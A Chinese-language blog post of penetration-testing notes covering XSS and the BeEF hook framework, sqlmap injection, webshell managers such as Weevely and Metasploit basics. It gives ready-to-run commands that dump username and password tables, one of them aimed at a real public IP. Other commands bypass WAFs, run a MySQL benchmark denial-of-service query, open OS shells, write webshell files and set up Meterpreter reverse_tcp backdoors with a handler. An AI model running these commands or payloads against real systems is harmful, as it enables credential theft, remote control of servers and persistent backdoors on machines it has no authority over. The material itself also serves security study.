<p>​    Burp Suite的强大除了自身提供了丰富的可供测试人员使用的功能外，其提供的第三方拓展插件的功能也极大的方便使用者编写自己的自定义插件。它支持的插件类型有java，python，ruby，三种。无论哪种语言的实现，开发者只要选择自己熟悉的语言，按照接口规范去实现想要的功能即可。</p>
<p>1．     BApp store插件商店下载；2. 开源插件项目github：<a target="_blank" rel="noopener" href="https://github.com/search?utf8=%E2%9C%93%25q=burp">https://github.com/search?utf8=%E2%9C%93%q=burp</a></p>
<h2 id="xss漏洞初步学习"><a href="#xss漏洞初步学习" class="headerlink" title="xss漏洞初步学习"></a>xss漏洞初步学习</h2><p>——xss简介</p>
<p>​    XSS跨站脚本攻击（Cross Site Scripting），是将java script代码插入web页面中，之后当用户浏览页面时，会执行嵌套在web页面里面的java script代码，从而达到攻击用户的目的。为了跟html里面的层叠样式表（CSS，Cascading Style Sheets）作区分，所以叫作XSS。</p>
<p>​    注入攻击的本质，是吧用户输入的数据当作代码执行。</p>
<p>​    这里有两个关键条件：1. 用户能够控制输入；2. 原本程序要执行的代码，拼接了用户输入的数据。</p>
<p>——原理</p>
<p>​    XXS主要拼接什么：SQL注入拼接的是操作数据库的SQL语句。XSS拼接的是网页的html代码，一般而言我们是可以拼接出合适的html代码去执行恶意的JS语句（总结：xss就是拼接恶意的html，执行并能够成功解析）</p>
<p>​    xss的危害：盗取Cookie（用的最频繁的）；盗取内网ip；获取浏览器保存的明文密码；截取网页屏幕；网页上的键盘记录。</p>
<p>——种类</p>
<p>​    反射型：你提交的数据成功的实现了XSS，但是仅仅是对你这次访问产生了影响，是非持久性攻击。</p>
<p>​    存储型XSS（持久性）：你提交的数据成功的实现了XSS，存入了数据库，别人访问这个页面的时候就会自动触发。</p>
<p>​    DOM型XSS：DOM（document object model 文本对象模型），客户端脚本处理逻辑导致的安全问题。</p>
<p>——XSS平台</p>
<p>​    <a target="_blank" rel="noopener" href="http://xss.tf/">http://xss.tf/</a>      <a target="_blank" rel="noopener" href="https://xsspt.com/index.php?do=login">https://xsspt.com/index.php?do=login</a> 或搜索引擎搜索</p>
<p>​    XSS平台方便了XSS攻击，只需要引入一个平台外部链接就可以实现各种功能。</p>
<p>——挑战实例</p>
<p>​    360插件：xss插件扫描Okee.360.cn</p>
<p>​    更多工具：<a target="_blank" rel="noopener" href="https://github.com/rajeshmajumdar/BruteXSS">https://github.com/rajeshmajumdar/BruteXSS</a></p>
<h2 id="beef-XSS"><a href="#beef-XSS" class="headerlink" title="beef-XSS"></a>beef-XSS</h2><p>——简介</p>
<p>​    beef（The Browser Exploitation Framework）；一款浏览器攻击框架，用rubby语言开发的，kali中默认安装的一个模块，用于实现对XSS漏洞的攻击和利用。</p>
<p>​    beef主要是往网页中插入一段名为hook.js的JS脚本代码，如果浏览器访问了有hook.js（钩子）的页面，就会被hook（钩住），勾连的浏览器会执行初始代码返回一些信息，接着目标主机会每隔一段时间（默认为1秒）向beef服务器发送一个请求，询问是否有新的代码需要执行。beef浏览器本质上就像一个web应用，被分为前端和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示，beef持有者可以通过浏览器来登录beef的后端，来控制前端（用户的浏览器）。beef一般和XSS漏洞结合使用。</p>
<p>​    —打开方式</p>
<p>\1.  直接点击桌面上的图标，过5秒左右，然后它会自动打开命令行和浏览器beef的登录框</p>
<p>\2.  任意目录，直接输入命令：beef-xss打开，过5秒左右，然后会自动打开命令行和beef浏览器的登录框</p>
<p>\3.  进入/usr/share/beef-xss/，输入命令：./beef打开，然后手动打开浏览器链接。</p>
<p>—配置</p>
<p>​    修改默认密码：vim /etc/beef-xss/config.yaml 修改配置文件</p>
<p>​    测试界面：<a target="_blank" rel="noopener" href="https://127.0.0.1:3000/demos/butcher/index.html">https://127.0.0.1:3000/demos/butcher/index.html</a></p>
<h2 id="sqlmap之sql注入原理利用"><a href="#sqlmap之sql注入原理利用" class="headerlink" title="sqlmap之sql注入原理利用"></a>sqlmap之sql注入原理利用</h2><p>——简介</p>
<p>​    SQL注入就是把SQL命令插入到web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句的。</p>
<p>​    攻击者通过构造不同的SQL语句来实现对数据库的操作。</p>
<p>​    关键条件：1. 参数用户可控；2. 参数带入数据库查询。</p>
<p>​    —SqlMap-开源渗透测试工具</p>
<p>\1.  开源的渗透测试工具、自动化检测和利用SQL注入漏洞</p>
<p>\2.  支持对多种数据库进行注入测试</p>
<p>\3.  支持多种注入技术，例如，盲注、时间延时注入、报错注入</p>
<p>\4.  支持枚举用户数据库信息，例如，用户名、密码</p>
<p>\5.  自动识别哈希密码，并且使用密码字典进行破解</p>
<p>sqlmap是渗透测试人员对sql注入漏洞进行检测的最佳工具</p>
<p>——sqlmap安装</p>
<p>\1.  工具地址：<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
<p>\2.  安装配置：<a target="_blank" rel="noopener" href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a></p>
<p>\3.  python2和python3共存：<a target="_blank" rel="noopener" href="https://www.zkaq.org/t/3572.html">https://www.zkaq.org/t/3572.html</a></p>
<p>——sqlmap注入流程</p>
<p>\1.  判断sql注入点；2. 查询数据库信息；3. 根据数据库查询数据表；4. 根据数据表查询列信息。</p>
<p>——sqlmap测试流程</p>
<p>\1.  检测是否存在注入点</p>
<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://117.41.229.122:8840/single.php?id=1%E2%80%9D">http://117.41.229.122:8840/single.php?id=1”</a></p>
<p>\2.  检测数据库信息</p>
<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://117.41.229.122:8840/single.php?id=1%E2%80%9D">http://117.41.229.122:8840/single.php?id=1”</a> –dbs</p>
<p>\3.  通过数据库查询数据表信息</p>
<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://117.41.229.122:8840/single.php?id=1%E2%80%9D">http://117.41.229.122:8840/single.php?id=1”</a> -D cake –tables</p>
<p>\4.  通过数据表查询查询字段信息</p>
<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://117.41.229.122:8840/single.php?id=1%E2%80%9D">http://117.41.229.122:8840/single.php?id=1”</a> -D cake –T user –columns</p>
<p>\5.  通过字段枚举字段内容</p>
<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://117.41.229.122:8840/single.php?id=1%E2%80%9D">http://117.41.229.122:8840/single.php?id=1”</a> -D cake –T user -C “username.password” -dump</p>
<p>——sqlmap命令操作</p>
<p>\1.  查看数据库相关信息</p>
<p>–current-user      枚举当前用户</p>
<p>–dbs             枚举当前数据库</p>
<p>–is-dba           枚举可用的数据库</p>
<p>–passwords       枚举数据库权限</p>
<p>​    \2. 指纹识别</p>
<p>​       -f                启用广泛的数据识别</p>
<p>​       -b                检测数据库指纹</p>
<p>​       –hostname       枚举主机名称</p>
<p>​    \3. Waf识别</p>
<p>​       –identify-waf     检测waf信息</p>
<p>——sqlmap更新</p>
<p>​    python sqlmap.py –update</p>
<h2 id="sqlmap之sql注入一"><a href="#sqlmap之sql注入一" class="headerlink" title="sqlmap之sql注入一"></a>sqlmap之sql注入一</h2><p>——常见的注入方式</p>
<p>\1.  用于access数据库注入；2. 用于cookie注入；3. post注入；4. mysql注入</p>
<p>常见SQLmap使用方法：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hack404/p/10830239.html">https://www.cnblogs.com/hack404/p/10830239.html</a></p>
<p>​                      <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ichunqiu/p/5805108.html">https://www.cnblogs.com/ichunqiu/p/5805108.html</a></p>
<h1 id="一、SQLMAP用于Access数据库注入"><a href="#一、SQLMAP用于Access数据库注入" class="headerlink" title="一、SQLMAP用于Access数据库注入"></a>一、SQLMAP用于Access数据库注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py-u&quot;`http://www.xxx.com/en/CompHonorBig.asp?id=7`&quot;</span><br><span class="line">python sqlmap.py-u&quot;`http://www.xxx.com/en/CompHonorBig.asp?id=7`&quot;` `--tables</span><br><span class="line">python sqlmap.py-u&quot;`http://www.xxx.com/en/CompHonorBig.asp?id=7`&quot;` `--columns -T admin</span><br><span class="line">python sqlmap.py-u&quot;`http://www.xxx.com/en/CompHonorBig.asp?id=7`&quot;` `--dump -T admin -C &quot;username,password&quot;</span><br></pre></td></tr></table></figure>

<h1 id="二、SQLMAP用于Cookie注入"><a href="#二、SQLMAP用于Cookie注入" class="headerlink" title="二、SQLMAP用于Cookie注入"></a>二、SQLMAP用于Cookie注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py-u&quot;`http://www.xxx.org/jsj/shownews.asp`&quot;` `--cookie &quot;id=31&quot; --table --level 2</span><br><span class="line">python sqlmap.py-u&quot;`http://www.xxx.org/jsj/shownews.asp`&quot;` `--cookie &quot;id=31&quot; --columns -T</span><br><span class="line">python sqlmap.py-u&quot;`http://www.xxx.org/jsj/shownews.asp`&quot;` `--cookie &quot;id=31&quot; --dump -T</span><br></pre></td></tr></table></figure>

<h1 id="三、SQLMAP用于mysql中DDOS攻击"><a href="#三、SQLMAP用于mysql中DDOS攻击" class="headerlink" title="三、SQLMAP用于mysql中DDOS攻击"></a>三、SQLMAP用于mysql中DDOS攻击</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py-u [url]http://192.168.159.1/news.php?id=1[/url]--sql-shell</span><br><span class="line">select` `benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f)</span><br></pre></td></tr></table></figure>

<h1 id="四、SQLMAP用于mysql注入"><a href="#四、SQLMAP用于mysql注入" class="headerlink" title="四、SQLMAP用于mysql注入"></a>四、SQLMAP用于mysql注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py-u&quot;`http://www.xxx.com/link.php?id=321`&quot;` `--dbs</span><br><span class="line">python sqlmap.py-u&quot;`http://www.xxx.com/link.php?id=321`&quot;` `-D dataname--tables</span><br><span class="line">python sqlmap.py-u&quot;`http://www.xxx.com/link.php?id=321`&quot;` `-D dataname-T table_name--columns</span><br><span class="line">python sqlmap.py-u&quot;`http://www.xxx.com/link.php?id=321`&quot;` `-D dataname-T table_name-C &quot;id,user,password&quot;` `--dump</span><br></pre></td></tr></table></figure>

<h1 id="五、SQLMAP中post登陆框注入"><a href="#五、SQLMAP中post登陆框注入" class="headerlink" title="五、SQLMAP中post登陆框注入"></a>五、SQLMAP中post登陆框注入</h1><p>\1. 浏览器打开目标地址http:// <a target="_blank" rel="noopener" href="http://www.xxx.com/">www.xxx.com</a> /Login.asp</p>
<p>\2. 配置burp代理(127.0.0.1:8080)以拦截请求</p>
<p>\3. 点击login表单的submit按钮</p>
<p>\4. 这时候Burp会拦截到了我们的登录POST请求</p>
<p>\5. 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</p>
<p>\6. 运行sqlmap并使用如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sqlmap.py -r search-test.txt -p tfUPass</span><br></pre></td></tr></table></figure>

<p>自动搜索注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap-u [url]http://testasp.vulnweb.com/Login.asp[/url]--forms</span><br></pre></td></tr></table></figure>

<p>指定参数注入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap-u [url]http://testasp.vulnweb.com/Login.asp[/url]--data &quot;tfUName=321&amp;tfUPass=321&quot;</span><br></pre></td></tr></table></figure>

<h1 id="六、SQLMAP中Google搜索注入"><a href="#六、SQLMAP中Google搜索注入" class="headerlink" title="六、SQLMAP中Google搜索注入"></a>六、SQLMAP中Google搜索注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap-g inurl:php?id=</span><br></pre></td></tr></table></figure>

<h1 id="七、SQLMAP中的请求延迟"><a href="#七、SQLMAP中的请求延迟" class="headerlink" title="七、SQLMAP中的请求延迟"></a>七、SQLMAP中的请求延迟</h1><p>参数 –delay –safe-freq</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py--dbs -u &quot;`http://xxx.cn/index.php/Index/view/id/40.html`&quot; --delay 1</span><br><span class="line">python sqlmap.py--dbs -u &quot;`http://xxx.cn/index.php/Index/view/id/40.html`&quot; --safe-freq 3</span><br></pre></td></tr></table></figure>

<h1 id="八、SQLMAP绕过WAF防火墙"><a href="#八、SQLMAP绕过WAF防火墙" class="headerlink" title="八、SQLMAP绕过WAF防火墙"></a>八、SQLMAP绕过WAF防火墙</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*sqlmap-u [url]http://192.168.159.1/news.php?id=1[/url]-v3*` `*--dbs --batch --tamper &quot;space2morehash.py&quot;*</span><br></pre></td></tr></table></figure>

<p>space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py</p>
<p>都是编码方式</p>
<p>space2hash.py base64encode.py charencode.py</p>
<h1 id="九、SQLMAP查看权限"><a href="#九、SQLMAP查看权限" class="headerlink" title="九、SQLMAP查看权限"></a>九、SQLMAP查看权限</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap-u [url]http://192.168.159.1/news.php?id=1[/url]--privileges</span><br></pre></td></tr></table></figure>

<h1 id="十、SQLMAP伪静态注入-1-查找数据库"><a href="#十、SQLMAP伪静态注入-1-查找数据库" class="headerlink" title="十、SQLMAP伪静态注入(1) 查找数据库"></a>十、SQLMAP伪静态注入(1) 查找数据库</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py-u&quot;`http://xxx.cn/index.php/Index/view/id/40.html`&quot;` `--dbs</span><br><span class="line">python sqlmap.py-u&quot;`http://xxx.cn/index.php/Index/view/id/40.html`&quot;` `-D dataname--tables</span><br><span class="line">python sqlmap.py-u&quot;`http://xxx.cn/index.php/Index/view/id/40.html`&quot;` `-D dataname-T tablename--columns</span><br><span class="line">python sqlmap.py -u &quot;`http://xxx.cn/index.php/Index/view/id/40.html`&quot;` `-D dataname -T *tablename -C &quot;password&quot;*` `*--dump*</span><br></pre></td></tr></table></figure>

<h1 id="十一、SQLMAP注入点执行命令与交互写shell"><a href="#十一、SQLMAP注入点执行命令与交互写shell" class="headerlink" title="十一、SQLMAP注入点执行命令与交互写shell"></a>十一、SQLMAP注入点执行命令与交互写shell</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*sqlmap-u [url]http://192.168.159.1/news.php?id=1[/url]--os-cmd=ipconfig*</span><br><span class="line">sqlmap-u [url]http://192.168.159.1/news.php?id=1[/url]--os-shell</span><br></pre></td></tr></table></figure>

<p>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p>
<p>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p>
<p>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap-r “c:\request.txt”-pid` `–dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write` `“f:\webshell\1112.php”</span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>——常见测试参数</p>
<p>\1.  指定参数进行测试</p>
<p>参数：*号，和-p选项</p>
<p>\2.  使用post方式提交注入：参数：–data选项</p>
<p>\3.  sqlmap扫描等级（1-5）</p>
<p>当-level的参数设定为2或者2以上的时候，sqlmap会尝试注入cookie参数。</p>
<p>\4.  自动执行默认选项</p>
<p>参数：–batch</p>
<p>\5.  使用代理服务器连接到目标URL</p>
<p>参数：–proxy</p>
<p>\6.  自动切换客户端请求</p>
<p>参数：-random-agent</p>
<p>\7.  设置测试线程数，默认线程1</p>
<p>参数：–threads</p>
<p>\8.  获取表中的数量</p>
<p>参数：–count</p>
<p>\9.  风险等级共有四个等级，默认为1，2会增加基于事件的测试语句，3会增加or语句的SQL注入测试。</p>
<p>参数：–risk</p>
<p>——测试等级</p>
<p>​    探测等级（1-5）：参数：–level</p>
<p>​    共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload.</p>
<p>​    这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。</p>
<p>​    总之，在你不确定那个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</p>
<p>​    风险等级：参数：–risk</p>
<p>​    共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。</p>
<p>​    在有些时候，例如在UPDATE的语句中，诸如一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。</p>
<p>——命令操作</p>
<p>\1.  数据库操作</p>
<p>–sql-shell 产生一个交互式的sql shell，用来执行sql命令</p>
<p>​    \2. 系统操作</p>
<p>​       –os-shell 产生交互式的操作系统的shell，用来执行cmd命令。</p>
<p>​       a). –os-shell系统操作的要求</p>
<p>​           1). 网站必须是root权限</p>
<p>​           2). 攻击者需要知道网站的绝对路径</p>
<p>​           3). GPC为off，php主动转义的功能关闭</p>
<p>​           4). secure_file_priv为空</p>
<p>​       b). 使用—os-shell后会生成两个文件</p>
<p>​           \1. 上传脚本文件；2. 后门文件。</p>
<p>——脚本介绍</p>
<p>\1.  脚本作用：帮助我们绕过一些waf，进行测试</p>
<p>\2.  脚本目录：Tamper目录下</p>
<h2 id="sqlmap之sql注入二"><a href="#sqlmap之sql注入二" class="headerlink" title="sqlmap之sql注入二"></a>sqlmap之sql注入二</h2><p>——sqlmap小技巧</p>
<p>\1.  判断可注入的参数；</p>
<p>\2.  判断可以用哪种SQL注入技术来注入；</p>
<p>\3.  识别出哪种数据库；</p>
<p>\4.  根据用户选择，读取哪些数据。</p>
<p>—sqlmap支持五种不同的注入模式：</p>
<p>\1.  基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</p>
<p>\2.  基于时间的盲注，即不能根据页面返回的内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>
<p>\3.  基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
<p>\4.  联合查询注入，可以使用union的情况下的注入。</p>
<p>\5.  堆查询注入，可以同时执行多条语句的执行时的注入。</p>
<p>—sqlmap注入监测</p>
<p>​    如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数。</p>
<p>​    共有7个等级，默认为1.</p>
<p>0、    只显示python错误以及严重的信息。</p>
<p>1、    同时显示基本信息和警告信息。（默认）</p>
<p>2、    同时显示debug信息。</p>
<p>3、    同时显示注入的payload。</p>
<p>4、    同时显示HTTP请求。</p>
<p>5、    同时显示HTTP响应头。</p>
<p>6、    同时显示HTTP响应页面。</p>
<p>注：如果想看到sqlmap发送的测试payload最好的等级就是3.</p>
<p>——Burp+sqlmap批量测试</p>
<p>​    burpsuite导出log配合sqlmap批量扫描注入点。</p>
<p>​    sqlmap可以批量扫描包含有request的日志文件，而request日志文件可以通过burpsuite来获取，因此通过sqlmap结合burpsuite工具，可以更加高效的对应用程序是否存在SQL注入漏洞进行地毯式的扫描。</p>
<p>\1.  首先是burp设置记录log，文件名任意。</p>
<p>\2.  把记录的log文件放在sqlmap目录下。</p>
<p>\3.  sqlmap读取log自动测试：</p>
<p>python sqlmap.py -l 文件名 –batch -smart</p>
<p>batch：自动选yes；  smart：启发式快速判断，节约时间。</p>
<p>\4.  最后能注入的URL会保存到out文件夹下。</p>
<p>注意：log文件中如果有sqlmap无法读取的字符（ascII码之外的字符）会读取失败。</p>
<p>​    —步骤</p>
<p>\1.  配置burpsuite下记录所有的request记录，并保存在指定文件夹。</p>
<p>\2.  执行命令：sqlmap.py -l burp.log –batch -smart 即可对burp.log中保存的所有request进行注入扫描。</p>
<p>windows版的sqlmap最后能注入的URL都会保存在c:\users\administrator.sqlmap文件下。</p>
<p>——sqlmap+burp</p>
<p>\1.  代理监听sqlmap测试语句</p>
<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://xxxx/">http://xxxx</a> –-proxy=<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p>
<p>\2.  sqlmap快速测试burp数据包</p>
<p>-r参数，从文件中读取数据包</p>
<p>​    \3. 使用burp插件跑sqlmap注入。</p>
<p>​       <a target="_blank" rel="noopener" href="https://github.com/portswigger/co2">https://github.com/portswigger/co2</a></p>
<h2 id="Webshell管理工具"><a href="#Webshell管理工具" class="headerlink" title="Webshell管理工具"></a>Webshell管理工具</h2><p>——简介</p>
<p>\1.  “web”的含义是显然需要服务器开放web服务</p>
<p>“shell”的含义是取得对服务器某种程度上操作权限</p>
<p>\2.  使用者</p>
<p>站长：网站管理、服务器管理、管理数据库等</p>
<p>入侵者：后门程序、控制服务器、达到目的等</p>
<p>​    简称：后门，入侵者为了达到目的以及作为控制对方的后门文件。</p>
<p>——大马小马一句话</p>
<p>\1.  小马：文件体积较小、上传文件、文件修改、文件管理</p>
<p>\2.  大马（不推荐）</p>
<p>文件体积较大、功能齐全、能够提权、操作数据库等</p>
<p>\3.  一句话木马（主流）</p>
<p>短小精悍、功能强大、隐藏性好、客户端直接管理</p>
<p>——中国菜刀</p>
<p>​    它是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要 ，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英式编译，支持多国语言输入显示。</p>
<p>\1.  安装：<a target="_blank" rel="noopener" href="http://www.maicaidao.co/">http://www.maicaidao.co/</a></p>
<p>\2.  使用：图形化操作</p>
<p>webshell管理工具是渗透人员常用的连接工具。</p>
<p>——中国蚁剑</p>
<p>​    它是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。是一款非常优秀的webshell管理工具。</p>
<p>\1.  安装</p>
<p>加载器：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Loader">https://github.com/AntSwordProject/AntSword-Loader</a></p>
<p>​      蚁剑源码：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p>
<p>​       首先下载加载器，以及源码，使用加载器加载源码即可</p>
<p>\2.  使用</p>
<p>图形化操作：开源、跨平台、图形化、webshell管理工具</p>
<p>——冰蝎Behinder</p>
<p>​    作为新型加密网站管理客户端，冰蝎算是作为中国菜刀的替代者。</p>
<p>\1.  安装：<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases">https://github.com/rebeyond/Behinder/releases</a></p>
<p>运行环境：jre6~jre8：<a target="_blank" rel="noopener" href="https://www.java.com/">https://www.java.com</a></p>
<p>\2.  使用：图形化操作</p>
<h2 id="Linux-shell-Weevely"><a href="#Linux-shell-Weevely" class="headerlink" title="Linux shell Weevely"></a>Linux shell Weevely</h2><p>——简介</p>
<p>​    它是一款使用python编译的webshell工具，集webshell生成和连接于一身，采用c/s模式构建，可以算作是linux下的一款php菜刀替代工具，具有很好的隐蔽性。</p>
<p>​    在linux上使用时还是很好的，集服务器错误配置审计，后门放置，暴力破解，文件管理，资源搜索，网络代理，命令执行，数据库操作，系统信息收集及端口扫描等功能。</p>
<p>​    地址：<a target="_blank" rel="noopener" href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a></p>
<p>​    其他webshell管理工具（扩展）：中国菜刀、C刀、中国蚁剑、冰蝎、XISE</p>
<p>——使用</p>
<p>\1.  生成shell：weevely generate <password> &lt;文件名&gt;</p>
<p>\2.  连接shell：weevely <URL> <password> [cmd]</p>
<p>\3.  生成混淆shell：weevely generate -obfuscator cleartext1_php <password> &lt;文件名&gt;</p>
<p>——模块</p>
<p>\1.  信息收集</p>
<p>:system_info 收集系统信息</p>
<p>:system_info -info client_ip 查找自己连接ip</p>
<p>\2.  文件管理</p>
<p>:file_touch 修改文件时间</p>
<p>:file_touch -human-ts ‘2018-09-15 20:41:20’ 文件名</p>
<p>\3.  命令执行</p>
<p>:shell_php 执行PHP命令</p>
<p>:shell_php system(‘ipconfig’)；</p>
<p>​    —生成meterpreter会话</p>
<p>​       :backdoor_meterpreter -payload php/meterpreter/reverse_tcp -lhost 本机IP -port 端口</p>
<p>​    —MSF设置</p>
<p>​       use exploit multi/handler</p>
<p>​       show payloads</p>
<p>​       set payload php/meterpreter/reverse_tcp</p>
<p>​       show options</p>
<p>​       set lhost 本机IP</p>
<p>​       run</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="Metasploit框架与基本命令"><a href="#Metasploit框架与基本命令" class="headerlink" title="Metasploit框架与基本命令"></a>Metasploit框架与基本命令</h2><p>——简介</p>
<p>​    它是一个免费的、可下载的框架，通过它可以很容易的获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。</p>
<p>——模块</p>
<p>​    综合渗透测试框架</p>
<p>​    Auxiliary 辅助模块 为渗透测试信息收集提供了大量的辅助模块支持</p>
<p>​    Exploits 攻击模块 利用发现的安全漏洞或配置弱点对远程目标系统进行攻击，从而获得对远程目标系统访问权的代码组件</p>
<p>​    Payload 攻击载荷模块 攻击成功后促使靶机运行的一段植入代码</p>
<p>​    Post 后渗透攻击模块 收集更多信息或进一步访问被利用的目标系统</p>
<p>​    Encoders 编码模块 将攻击载荷进行编码，来绕过防护软件拦截</p>
<p>——MSF基础指令</p>
<p>​    help/?     帮助菜单</p>
<p>​    exit        退出MSF控制台</p>
<p>​    Back       返回上一级</p>
<p>​    info       显示一个或多个模块的信息</p>
<p>​    show      显示所给类型的模块</p>
<p>​    background 将当前操作在后台进行</p>
<p>​    use        使用所选择的模块</p>
<p>​    set        设置选项</p>
<p>​    unset      取消设置的选项</p>
<p>​    显示所有的exploit模块：show exploits</p>
<p>​    显示模块信息：info windows/smb/ms17_010_eternalblue</p>
<p>——MSF实践</p>
<p>​    开启数据库：service postgresql start</p>
<p>​    初始化msf数据库：msfdb init</p>
<p>​    开启MSF：msfconsole</p>
<p>​    查看数据连接状态：db_status</p>
<p>——常用模块粗讲</p>
<p>​    Auxiliary模块：show auxiliary</p>
<p>​    命名规则：功能/服务/名称     scanner/smb/smb_ms17_010</p>
<p>​    Exploits模块：show exploits</p>
<p>​    rank表示好用级别：normal，excellent，good，average</p>
<p>​    命名规则：操作系统/服务/名称    windows/smb/ms17_010_eternalblue</p>
<p>​    Payload模块：命名规则：操作系统/类型/名称 windows/x64/meterpreter/reverse_tcp</p>
<p>——msf搜索应用</p>
<p>​    根据名称搜索：search ms17_010</p>
<p>​    联合搜索：search name:ms17 type:auxiliary</p>
<p>​    设置模块：use auxiliary/scanner/smb/smb_ms17_010</p>
<p>​    查看选项：options</p>
<p>——MSF主机管理</p>
<p>​    命令：hosts    通过该命令可以添加主机以及删除主机等</p>
<p>​    列出当前mac地址：hosts -c mac</p>
<h2 id="MSF-扫描模块"><a href="#MSF-扫描模块" class="headerlink" title="MSF-扫描模块"></a>MSF-扫描模块</h2><p>——信息收集</p>
<p>​    —获取whois信息：whois xxx.com</p>
<p>通过whois等信息组合生成针对性的密码字典</p>
<p>​    密码存在规律性，可破解性，对应性（撞库）</p>
<p>​    在线密码生成：<a target="_blank" rel="noopener" href="https://www.bugku.com/mima/">https://www.bugku.com/mima/</a></p>
<p>​    PoCBox辅助测试平台：<a target="_blank" rel="noopener" href="https://github.com/gh0stkey/PoCBox">https://github.com/gh0stkey/PoCBox</a></p>
<p>​    密码字典生成工具：phpstudy卡伊码：<a target="_blank" rel="noopener" href="http://127.0.0.1/PoCBox-master/">http://127.0.0.1/PoCBox-master/</a></p>
<p>​           测试账号：<a href="mailto:test123@163.com">test123@163.com</a></p>
<p>​    密码泄露查询：<a target="_blank" rel="noopener" href="https://monitor.firefox.com/">https://monitor.firefox.com/</a></p>
<p>​                  <a target="_blank" rel="noopener" href="https://haveibeenpwned.com/">https://haveibeenpwned.com/</a></p>
